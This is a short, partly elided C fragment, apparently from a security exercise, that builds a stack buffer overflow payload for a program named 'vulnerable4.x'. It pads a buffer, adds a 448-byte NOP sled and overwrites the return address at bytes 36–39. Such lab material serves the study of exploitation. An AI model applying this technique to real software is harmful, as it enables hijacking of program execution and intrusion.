 ...
 *   This file generates binary output, which is fed to vulnerable4.x
...
int main()
{
    ...
    sscanf(response, "%x", &addr);

    sprintf(buffer, "111122223333444455556666777788889999");
    strcat(buffer, "    ");
    for(int i = 0; i < 448; i++) {
        strcat(buffer, "\x90");
    }
    ...
    buffer[36] = (addr >> 0) & 0xff;
    buffer[37] = (addr >> 8) & 0xff;
    buffer[38] = (addr >> 16) & 0xff;
    buffer[39] = (addr >> 24) & 0xff;
